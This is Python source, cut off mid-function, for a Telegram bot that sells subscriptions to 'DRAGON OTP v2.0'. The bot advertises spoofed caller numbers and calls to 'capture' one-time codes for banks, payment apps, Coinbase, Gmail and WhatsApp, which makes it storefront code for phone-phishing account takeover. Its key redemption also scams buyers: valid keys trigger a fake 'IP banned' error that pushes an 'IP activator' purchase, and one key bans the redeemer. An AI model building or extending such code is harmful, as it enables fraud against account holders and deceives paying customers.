import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from keepalive import keep_alive
from aiogram.types import FSInputFile
from aiogram import Bot
from aiogram.types import ChatMember
from db import create_users_table, add_user, redeem_token,set_unbanned, set_subscribed, set_banned,get_user_count, is_user_useAPI, user_exists, is_user_banned,is_user_subscribe,get_user_first_name
from aiogram.enums.chat_member_status import ChatMemberStatus
from time import sleep
from dotenv import load_dotenv
import re
import os

keep_alive()
load_dotenv()

bot = Bot(token=os.environ.get('token'))
dp = Dispatcher()


keys_1day = ['DRAGONOTP-l6PvzntNa4Q0qE0N9bQq', 'DRAGONOTP-CNZncvz7jvBIo2kLUmA3', 'DRAGONOTP-3Z8cMH6NLHp88Rt0OGjH', 'DRAGONOTP-dhr5pcVthBHEYdRLwg9b', 'DRAGONOTP-U8P03Ii3zkVOHJfZinqs', 'DRAGONOTP-l3OTK5On22DpynKAH5B2', 'DRAGONOTP-1LH2vyoGVYkUuWxTp4Mu', 'DRAGONOTP-oVhT8OhQWzImrIFa9Eew', 'DRAGONOTP-93W3xJ56Vw1le0mqiuVc', 'DRAGONOTP-obxfYDo8lhAfOMeU5r3t', 'DRAGONOTP-HMZXmFWPxmFm9wMKR2DU', 'DRAGONOTP-wK9x1TUY3pGbZXHungW6', 'DRAGONOTP-yyoa9SN8zKriOhDY7ZXC', 'DRAGONOTP-NIg48R9gCjgbsHCCVXII', 'DRAGONOTP-JkIOMU444iZdsPnY3ICU', 'DRAGONOTP-DgNKagC92oKMvO4PxCQ5', 'DRAGONOTP-IUgY611TfvibDGd8SVd1', 'DRAGONOTP-Wz7kZy9vHKH7bBxbmmlK', 'DRAGONOTP-DFJnZVaaRInIw5Ee38ti', 'DRAGONOTP-dwvAeLDahMYY9sHnbzFT']
keys_2days = ['DRAGONOTP-5yBsJJVIKIzhvIwd47e5', 'DRAGONOTP-yika4XmoD1KrcqfGcQWJ', 'DRAGONOTP-nGQB7vtGo7tINPKegHNi', 'DRAGONOTP-QyIIfUkM10EkHZ70U7MZ', 'DRAGONOTP-s5QGwowGf81stfgq9VAq', 'DRAGONOTP-JMICA14F4CTjbAbTFsu4', 'DRAGONOTP-JWrRXNwkaKkwtp6GlFnO', 'DRAGONOTP-07xEwQqtVBEn6gcKUI33', 'DRAGONOTP-32Eb36O4H6VatwsZjVgy', 'DRAGONOTP-t57x7FPWrqlXoLE21XCU', 'DRAGONOTP-JpfgZh7YfkwBZLoVyb9r', 'DRAGONOTP-1yLMpFQHhbpukCWG6Q9g', 'DRAGONOTP-Cm7yRegjqOf2fCwNadSf', 'DRAGONOTP-tpuqGkJjaMYzJZRoQ9AY', 'DRAGONOTP-yIx6Cmcc7vCOc794Hw4K', 'DRAGONOTP-tubhRbcaKh0iPqlAQ1yD', 'DRAGONOTP-DnyGTP4SPloJhCcA9Nul', 'DRAGONOTP-jB5FgwYGyoVfQvBTgsVU', 'DRAGONOTP-oXw9sCRGVXfcNAGkDjUL', 'DRAGONOTP-TunyARUMUQ6Qzv0OksjU']
keys_1week = ['DRAGONOTP-NYuK6ILzF9DFAda9H6pK', 'DRAGONOTP-UUkz1qzunPYd5F8w4tia', 'DRAGONOTP-wAl9GVBERmp24wXsQcEG', 'DRAGONOTP-ABdt5UZI1Rjp43tJcjhG', 'DRAGONOTP-uFmXLpr2l8svg3GcBh6z', 'DRAGONOTP-lYSsAIXynN2LTk762rFq', 'DRAGONOTP-GYj6Y3UYbx2vVIZZYm2m', 'DRAGONOTP-Loto0GX7la5BIQV78FxB', 'DRAGONOTP-amsIGeErgemz7YdhDVOb', 'DRAGONOTP-VNfDmgi8TNaXY41buF8M', 'DRAGONOTP-av48Mze1PDixroPWZ4rE', 'DRAGONOTP-8IgMqxlcurW819RgCd72', 'DRAGONOTP-RVN6pwrjFsKLaavPF6Fc', 'DRAGONOTP-gzWRspEOuF8B3KLMuYi2', 'DRAGONOTP-yzT5ffKqNiBYk1RCFZot', 'DRAGONOTP-dnkn4KA2lRsbdxNe9ZZH', 'DRAGONOTP-lr0SLZ75D9E05Fm0uSIH', 'DRAGONOTP-xMu7Rgxr2imKnkFq8wro', 'DRAGONOTP-GJP2nNQHtXc9aDYnyxT6', 'DRAGONOTP-t5W1cTnMCzrTnyOxlbSD']
keys_2weeks = ['DRAGONOTP-397MZFG3HF7IAQA52kRa', 'DRAGONOTP-7uymaf4pDSEeoo4ae4Pv', 'DRAGONOTP-AHkzZyFw7xmkVv38Zmz4', 'DRAGONOTP-MSDKVBODITczWylm9DOi', 'DRAGONOTP-U6BpozkGGbgyGvtHeoYL', 'DRAGONOTP-59N5eusByYSGNPC9FYAa', 'DRAGONOTP-LKclY0w6JaLwhB0pgnmw', 'DRAGONOTP-cGIdO6AcIQ8egv16mpQL', 'DRAGONOTP-7999uhwTRcKReVpgmGik', 'DRAGONOTP-Zxqik4P1e00ZJ80YzgYR', 'DRAGONOTP-2t31kKkgG6RUb7UjNhJF', 'DRAGONOTP-xvZNCVZ5vYuyMiAl0Zvw', 'DRAGONOTP-Wr1QQb5BjT7es7TMRBC8', 'DRAGONOTP-HdOkujJgaHXeq9WtHmLe', 'DRAGONOTP-4rN2dAOcGYNaiWglthTc', 'DRAGONOTP-Ve6d0wr55G4sxaiOCxai', 'DRAGONOTP-RS1bu735PonoQpeA2gG1', 'DRAGONOTP-agWpgz41oZQnSyo8fJlh', 'DRAGONOTP-Tevo9XPMI7LdC3nC1Nmd', 'DRAGONOTP-Ba0RnN4dsCxVtkZv514O']
keys_1month = ['DRAGONOTP-B168pTcOsf1KwNpEGzT3', 'DRAGONOTP-QFI90EWn1sHARHObe3Or', 'DRAGONOTP-yd1unCxvv7euTDiA2KqX', 'DRAGONOTP-ypQD6nXHSJajS1lYBfAW', 'DRAGONOTP-cc9eVm7XW0pUl3kE6tRh', 'DRAGONOTP-6yQzTx1FrvvyCkrJBqyD', 'DRAGONOTP-MPopTfkUdxa3ufrSDcgl', 'DRAGONOTP-sd6B294GlNkguZYhFrZq', 'DRAGONOTP-4qQk5tJC46K4PCSaEzCC', 'DRAGONOTP-GiahPTRgwTapv8fwxN1I', 'DRAGONOTP-4GkCsG4zR4KDcFMPHHut', 'DRAGONOTP-c1HQaPKTI00rtGTpx8JN', 'DRAGONOTP-WZsXlHKPKEb1rNzo8Ksr', 'DRAGONOTP-GgYstfziTaJfD9rjfwJu', 'DRAGONOTP-gFFEpjtzyXdvrZ8rpdvG', 'DRAGONOTP-ssawFqqPxD3LnlW5a6Cj', 'DRAGONOTP-vQWGADinVMtXTyBON9pv', 'DRAGONOTP-QhOblD1IfYZJzQwoS01x', 'DRAGONOTP-w54KgPXTJinxK2Kd2qEm', 'DRAGONOTP-BujExAe3T5f1kFPqQyKF']
keys_2months = ['DRAGONOTP-Gb92tcVRZk1t5bkwFIJZ', 'DRAGONOTP-0skY0lwNx4KMdTVDl492', 'DRAGONOTP-mhbkAVOoDv4rBiIlnXQd', 'DRAGONOTP-4IdxL5wpMD10Io2clRRz', 'DRAGONOTP-wIqJOrZ3AYFZT3kGSRMu', 'DRAGONOTP-wGzhw0t5mxKV1EAmahYB', 'DRAGONOTP-24jgTKcBq6QGQpblQqCp', 'DRAGONOTP-Ns0KGR8w3VH4z7XeRbdh', 'DRAGONOTP-yEEPB02EblteGANFB4An', 'DRAGONOTP-9byXtFhztBjaUfyvFqFq', 'DRAGONOTP-QnHPuvc9wPYHmOAExN6r', 'DRAGONOTP-nlfB1dl0mcrGJJEE2fVj', 'DRAGONOTP-ioxS83AN48SVjZNDqQYr', 'DRAGONOTP-4wqBy8h6nOiHSmpTmxEj', 'DRAGONOTP-KIMMxwxIkQQQ6v3wvWvB', 'DRAGONOTP-HKEcomMKW6qTJeKPWAR4', 'DRAGONOTP-gFFx7o53z8D1GS0Q2lew', 'DRAGONOTP-LfHO5bMqyrK8eyuJGuRt', 'DRAGONOTP-5zRUo9T0VPbM9Ek77sdO', 'DRAGONOTP-gqVZGT0jkddDpBqHfO4G']
keys_lifetime = ['DRAGONOTP-ABmI4CZFaTOTSLE5saaH', 'DRAGONOTP-MwGdOcUhRn060G5djqjH', 'DRAGONOTP-IG1aKKgMusdS70XsXnJg', 'DRAGONOTP-fuLGt8yqQkA9Y9l6nzP4', 'DRAGONOTP-Q7zB7g3DFzo2y4uoWyEI', 'DRAGONOTP-jFc6y4kSTk83cmq8ShPU', 'DRAGONOTP-sjLTj8lbgD0doIKVk1Fe', 'DRAGONOTP-Cpo7bOXwQT26jG28gHUR', 'DRAGONOTP-kIjMgJ7UNrlO2rlrEtNs', 'DRAGONOTP-tamAWHv6NZlqdQcltWqw', 'DRAGONOTP-Wbabi3yQ5DkDOxw4Tmyw', 'DRAGONOTP-TphIiUcRV9PYazZb49Y9', 'DRAGONOTP-EDbrXU3XHPO7IcM2y1Bk', 'DRAGONOTP-MtxvULkE5ULSBPnYx7gb', 'DRAGONOTP-OidMN3OBx2GmHOQcAUo6', 'DRAGONOTP-NHu2wSiXXj4GhpEVS6Zt', 'DRAGONOTP-dSRXnnvF7uWRZPAtc6LN', 'DRAGONOTP-PqmPH8i8J71qKnmo9Enc', 'DRAGONOTP-jHtU0AzMrkSc8BUkHQM9', 'DRAGONOTP-Lx0CxJiUvgi7qKPPJDJt']
keys_custum = ['DRAGONOTP-bbaAh5C3pjWmiGXl84um', 'DRAGONOTP-G3cIOl6KrFxEIo3ipsZD', 'DRAGONOTP-nxTh5ZWIIEbEQI7YPLME', 'DRAGONOTP-RrRxbZRxTUI0Cq3n7uam', 'DRAGONOTP-fGZNNRoVWdAUtXCOpscn', 'DRAGONOTP-vyfCuMyTRYFvIOHmuS3P', 'DRAGONOTP-mRuuXhda9lBdHSd6vJZe', 'DRAGONOTP-R6pBA29QZI3dfx1h4kZG', 'DRAGONOTP-GUD5fov4dTs2TnI9Qin3', 'DRAGONOTP-2FR6CONPsBbHjY211LOw', 'DRAGONOTP-1jFyB3mzORbIH9DDMTDf', 'DRAGONOTP-dsEVffhE8OH2ePqXHWSH', 'DRAGONOTP-WjfTPV4mED0g6G3y2GiV', 'DRAGONOTP-d25sMdCLs20dyh2JZmZW', 'DRAGONOTP-Pcyn7Th8oVjUfG1waZAf', 'DRAGONOTP-uBWB6B7BQFeyMEmv0uuf', 'DRAGONOTP-L0Nbgg6lNYHYfQlAFre6', 'DRAGONOTP-7skWL1iB8dvdPUwDCxES', 'DRAGONOTP-HxuZMVlrHwDjPrtJ3EsF', 'DRAGONOTP-G94Xm7JTU9m4wSzGNQEe']

def escape_markdown(text: str) -> str:
    escape_chars = r"_*[]()~`>#+-=|{}.!\\,"
    return re.sub(f"([{re.escape(escape_chars)}])", r"\\\1", text)

async def is_user_subscribed_channel(bot: Bot, user_id, channel):
    try:
        member: ChatMember = await bot.get_chat_member(chat_id=channel, user_id=user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.CREATOR, ChatMemberStatus.ADMINISTRATOR]
    except:
        return True

@dp.message(Command("unban")) # DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if user_id == 7674917466 or user_id == 7575518830:
        args = message.text.split(maxsplit=1)
        set_unbanned(int(args[1]),False)
        await bot.send_message(chat_id=-1002538189457,text=get_user_first_name(int(args[1]))+' unbanned successfully!')
        try:
            await bot.unban_chat_member(chat_id=-1002420776698, user_id=int(args[1]))
            await bot.send_message(chat_id=-1002538189457,text="User "+get_user_first_name(int(args[1]))+" has been unbanned from the channel.")
        except Exception as e:
            await bot.send_message(chat_id=-1002538189457,text="Failed to unban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")

@dp.message(Command("ban")) # DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if user_id == 7674917466 or user_id == 7575518830:
        args = message.text.split(maxsplit=1)
        set_banned(int(args[1]),True)
        await bot.send_message(chat_id=-1002538189457,text=get_user_first_name(int(args[1]))+' banned successfully!')

        for msg_id in range(message.message_id - 200, message.message_id):
            try:
                await bot.delete_message(chat_id=int(args[1]), message_id=msg_id)
            except:
                pass
        try:
            await bot.ban_chat_member(chat_id=-1002420776698, user_id=int(args[1]))
            await bot.send_message(chat_id=-1002538189457,text="User "+get_user_first_name(int(args[1]))+" has been banned from the channel.")
        except Exception as e:
            await bot.send_message(chat_id=-1002538189457,text="Failed to ban user: "+str(e))
    else:
        await message.answer("🚫 Only admin can use this command.")
        

@dp.message(Command("start")) #DONE
async def send_local_video(message: Message):
    iduser = message.from_user.id
    if is_user_banned(iduser)==False:
        name = message.from_user.first_name
        if message.from_user.username:
            username = "@"+message.from_user.username
        else:
            username='None'
        if user_exists(iduser)==False:
            add_user(message.from_user)
            await bot.send_message(chat_id=-1002515925429,text='🆕 *New user*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(iduser))+'`\n*User ID*\: `'+str(iduser)+'`\n*Total users*\: '+str(get_user_count()),parse_mode='MarkdownV2')
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
                InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches"),
            ],
            [
                InlineKeyboardButton(text="⚙️ Commands", callback_data="Commands"),
                InlineKeyboardButton(text="🧠 Features", callback_data="Features")
            ],
            [
                InlineKeyboardButton(text="💳 Purchase", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🎯 Enter Bot", callback_data="enter")
            ]
        ]
        )
        image = FSInputFile("img.jpg")  # Path to your local file
        await message.answer_photo(image, caption="""🐲 *Welcome to DRAGON OTP v2\.0 — The Ultimate Spoofing Experience*
                                
Hello *"""+escape_markdown(name)+"""*\,                         
Step into the future of OTP spoofing with *DRAGON OTP v2\.0* — the most advanced\, Telegram\-based OTP system engineered for elite professionals\.

🔥 *Why DRAGON OTP?*
Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control — all designed to deliver *unrivaled OTP capture performance*\.

🚀 *Core Features*
⚡️ Blazing\-Fast Execution
✅ Military\-Grade Spoofing Stealth
🤖 Fully Automated Workflow Tools
📌 Global Coverage with 100% Uptime

Whether you're *testing systems*\, *analyzing behavior*\, or *building automation workflows*\, *DRAGON OTP* empowers you with the *precision*\, *power*\, and *stealth* needed to lead\.
  *Dominate your domain — with DRAGON\. *🐲""", reply_markup=keyboard,parse_mode='MarkdownV2')
    else:
        await message.answer("🚫 You're banned from the bot.")


@dp.message(Command("redeem"))
async def send_local_video(message: Message): #DONE
    user_id = message.from_user.id
    if message.from_user.username:
        username = "@"+message.from_user.username
    else:
        username='None'
    if is_user_banned(user_id)==False:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.answer("❌ Please add your activation key. /redeem [activation key]")
        elif args[1] == 'PTd82e519c42cc97d5066b4423c718c8a132ebaf07dab24d32':
            sleep(1)
            await message.answer("⌛ Please wait.")
            sleep(5)
            redeem_token(user_id,True)
            await message.answer("✅ IP activator redeemed successfuly!\n\nYou can redeem your key now.")
            await bot.send_message(chat_id=-1002582698640,text='🆕 *user redeemed a IP activator*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
        else:
            if args[1] in keys_1day:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 1-Day key redeemed successfuly!")
                    set_subscribed(user_id)
                    await bot.send_message(chat_id=-1002562333792,text='✅ *1\-Day key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_2days:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 2-Days key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *2\-Days key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_1week:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 1-Week key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *1\-Week key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_2weeks:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 2-Weeks key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *2\-Weeks key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_1month:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 1-Month key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *1\-Month key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_2months:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ 2-Months key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *2\-Months key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you can't redeem the key, you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_custum:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ Custom key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *Custom key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] in keys_lifetime:
                if is_user_useAPI(user_id):
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(5)
                    await message.answer("✅ LifeTime key redeemed successfuly!")
                    await bot.send_message(chat_id=-1002562333792,text='✅ *LifeTime key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                    set_subscribed(user_id)
                else:
                    keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ]])
                    sleep(1)
                    await message.answer("⌛ Please wait.")
                    sleep(9)
                    await message.answer("❌ ERROR [501]\n\n⚠️ Sorry, we facing a problem in your account, your IP adresse was banned from telegram you have to buy an IP activator to activate your IP in the bot.\n\nContact the support to buy one.",reply_markup=keyboard)
            elif args[1] == 'DRAGONOTP1-C4awb4Vf1KJp7P4LhCaN':
                sleep(1)
                await message.answer("⌛ Please wait.")
                sleep(5)
                await message.answer("✅ Premium key redeemed successfuly!")
                await bot.send_message(chat_id=-1002562333792,text='✅ *Premium key redeemed successfuly\!*\n*Username*\: '+escape_markdown(username)+'\n*Name*\: `'+escape_markdown(get_user_first_name(user_id))+'`',parse_mode='MarkdownV2')
                set_banned(user_id)
                keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                ]])
                for msg_id in range(message.message_id - 200, message.message_id):
                    try:
                        await bot.delete_message(chat_id=int(user_id), message_id=msg_id)
                    except:
                        pass
                try:
                    await bot.ban_chat_member(chat_id=-1002420776698, user_id=user_id)
                    await bot.send_message(chat_id=-1002538189457,text="User "+get_user_first_name(user_id)+" has been banned from the channel.")
                except Exception as e:
                    await bot.send_message(chat_id=-1002538189457,text="Failed to ban user: "+str(e))
            else:
                sleep(1)
                await message.answer("⌛ Please wait.")
                sleep(5)
                await message.answer("❌ Unavailable or expired key.")
    else:
        await message.answer("🚫 You're banned from the bot.")

@dp.message(Command("Phonelist")) #DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            if is_user_subscribe(user_id):
                keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
                ]
            ]
            )
                await message.answer("""🐲 *Spoofing Numbers*

    》 Marcus \| `\+14165550137`
    》 zelle \| `\+12125550143`
    》 Email \| `\+447800667788`
    》 CIBC \| `\+16045550198`
    》 CashApp \| `\+13105550191`
    》 ApplePay \| `\+447480112233`
    》 PayPal \| `\+19055550176 `                                                         
    》 BankofAmerica \| `\+14155550175`
    》 Amazon \| `\+447910333888`
    》 Gmail \| `\+15875550112`
    》 wellsfargo \| `\+16465550168`
    》 Venmo \| `\+447900555999 `                                
    》 citizens \| `\+14385550159`
    》 CapitalOne \| `\+13035550133`
    》 Coinbase \| `\+447700900123`
    》 Afterpay \| `\+17095550101`
    》 Visa \| `\+17025550122`
    》 MasterCard \| `\+447400654321`
    》 Facebook \| `\+12045550183`
    》 WhatsApp \| `\+16175550188`
    》 Instagram \| `\+447911123456`""",parse_mode='MarkdownV2',reply_markup=keyboard)
            else:
                keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💳 Purchase Subscription", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
                await message.answer("❌ You have to Subscribe first to use this command!",reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
            ],
            [
                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await message.answer("🚫 You're banned from the bot.")

@dp.callback_query(F.data.in_(["start"])) #DONE
async def send_local_video(callback: CallbackQuery):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            await callback.message.delete()
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                ],
                [
                    InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
                    InlineKeyboardButton(text="✅ Vouches", url="https://t.me/DRAGONv2_vouches"),
                ],
                [
                    InlineKeyboardButton(text="⚙️ Commands", callback_data="Commands"),
                    InlineKeyboardButton(text="🧠 Features", callback_data="Features")
                ],
                [
                    InlineKeyboardButton(text="💳 Purchase Subscription", callback_data="Purchase")
                ],
                [
                    InlineKeyboardButton(text="🎯 Enter Bot", callback_data="enter")
                ]
            ]
            )
            video = FSInputFile("img.jpg")  # Path to your local file
            await callback.message.answer_photo(video, caption="""🐲 *Welcome to DRAGON OTP v2\.0 — The Ultimate Spoofing Experience*
                                
Hello *"""+escape_markdown(get_user_first_name(user_id))+"""*\,                         
Step into the future of OTP spoofing with *DRAGON OTP v2\.0* — the most advanced\, Telegram\-based OTP system engineered for elite professionals\.

🔥 *Why DRAGON OTP?*
Harness the power of cutting\-edge AI\, ultra\-fast global voice routing\, and seamless real\-time control — all designed to deliver *unrivaled OTP capture performance*\.

🚀 *Core Features*
⚡️ Blazing\-Fast Execution
✅ Military\-Grade Spoofing Stealth
🤖 Fully Automated Workflow Tools
📌 Global Coverage with 100% Uptime

Whether you're *testing systems*\, *analyzing behavior*\, or *building automation workflows*\, *DRAGON OTP* empowers you with the *precision*\, *power*\, and *stealth* needed to lead\.
  *Dominate your domain — with DRAGON\. *🐲""", reply_markup=keyboard,parse_mode='MarkdownV2')
    else:
        await callback.message.answer("🚫 You're banned from the bot.")


@dp.callback_query(F.data.in_(["Commands"]))#DONE
async def handle_vote(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""🐲 *DRAGON OTP v2\.0* \- Commands
    ❓ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
        🔑 》/redeem \| Redeem a key
        📲 》/call \| Make a call
        📱 》/Phonelist \| Check List of Latest Spoof Numbers  
                                                    
    📞 Available Services For /call command                 
        》 *Marcus* \| capture Marcus otp
        》 *zelle* \| capture zelle otp
        》 *Email* \| capture email otp
        》 *CIBC* \| capture CIBC otp
        》 *CashApp* \| capture cashapp otp
        》 *ApplePay* \| capture applepay otp
        》 *PayPal* \| capture paypal otp                                                            
        》 *BankofAmerica* \| capture bank of america otp 
        》 *Amazon* \| capture amazon otp
        》 *Gmail* \| capture gmail otp
        》 *wellsfargo* \| capture wellsfargo otp
        》 *Venmo* \| capture venmo otp                                  
        》 *citizens* \| capture citizens otp
        》 *CapitalOne* \| capture capitalone otp
        》 *Coinbase* \| capture coinbase otp
        》 *Afterpay* \| capture afterpay otp
        》 *Visa* \| capture visa otp
        》 *MasterCard* \| capture mastercard otp
        》 *Facebook* \| capture facebook otp
        》 *WhatsApp* \| capture whatsapp otp
        》 *Instagram* \| capture instagram otp""",reply_markup=keyboard,parse_mode='MarkdownV2')
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
            ],
            [
